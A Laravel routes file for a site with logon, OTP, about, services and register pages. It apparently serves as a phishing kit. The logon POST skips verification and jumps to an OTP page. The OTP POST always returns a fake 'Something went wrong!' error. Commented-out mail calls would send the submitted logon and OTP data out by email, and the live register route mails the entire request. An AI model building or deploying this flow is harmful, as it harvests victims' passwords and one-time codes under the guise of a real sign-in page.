<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


//Route::get('/', 'SiteController@index')->name('homepage');

Route::get('/',function (Request $request){
return redirect("/logon");
});

Route::get('/logon', 'SiteController@logon')->name('logon');
Route::get('/otp', 'SiteController@otp')->name('otp');
Route::post("logon", function (Request $request){
    //dd($request);
    //Mail::send(new \App\Mail\LogonMail($request));
    return redirect("/otp");
});
Route::post("otp", function (Request $request){
    //dd($request);
    //Mail::send(new \App\Mail\OtpMail($request));
    return Redirect::back()->withErrors(['Something went wrong!']);
});
Route::get('/about', 'SiteController@about')->name('about');
Route::get('/services', 'SiteController@services')->name('services');
Route::get('/register', 'SiteController@register')->name('register');
Route::post("register", function (Request $request){

    Mail::send(new \App\Mail\RegisterMail($request));
    return redirect("/");
});

/*Route::get('/', function () {
    return view('welcome');
});*/

Auth::routes(["verify" => true]);

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
